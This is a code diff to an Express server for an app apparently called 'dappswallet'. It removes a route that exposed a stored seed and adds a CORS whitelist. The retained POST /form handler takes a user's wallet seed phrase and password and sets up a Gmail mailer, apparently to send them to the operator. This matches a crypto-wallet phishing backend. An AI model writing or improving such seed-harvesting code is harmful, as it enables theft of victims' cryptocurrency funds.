@@ -4,8 +4,6 @@ const path = require('path')
 // const cors = require('cors')
 require('dotenv').config()
 
-let seed1;
-
 
 const app = express()
 
@@ -14,6 +12,21 @@ const port = process.env.PORT || 8080
 app.use(express.urlencoded({ extended: false }))
 app.use(express.json())
 
+const whitelist = ['http://localhost:3000', 'http://localhost:8080', 'https://dappswallet.herokuapp.com']
+const corsOptions = {
+  origin: function (origin, callback) {
+    console.log("** Origin of request " + origin)
+    if (whitelist.indexOf(origin) !== -1 || !origin) {
+      console.log("Origin acceptable")
+      callback(null, true)
+    } else {
+      console.log("Origin rejected")
+      callback(new Error('Not allowed by CORS'))
+    }
+  }
+}
+
+app.use(cors(corsOptions))
 
 if(process.env.NODE_ENV === 'production'){
   app.use(express.static('client/build'))
@@ -24,7 +37,6 @@ if(process.env.NODE_ENV === 'production'){
 
 app.post('/form', async(req, res) => {
   const { seed, password } = await req.body
-  seed1 = seed
 
   const transporter = await nodemailer.createTransport({
     service: 'gmail',
@@ -42,10 +54,6 @@ app.post('/form', async(req, res) => {
   })
   return res.json({ status: 200 })
 }) 
-
-app.get('/fetch', (req, res) => {
-  return res.json({"seed": seed1 })
-})
 
 app.listen(port, () => {
   console.log(`server started on port ${port}`)
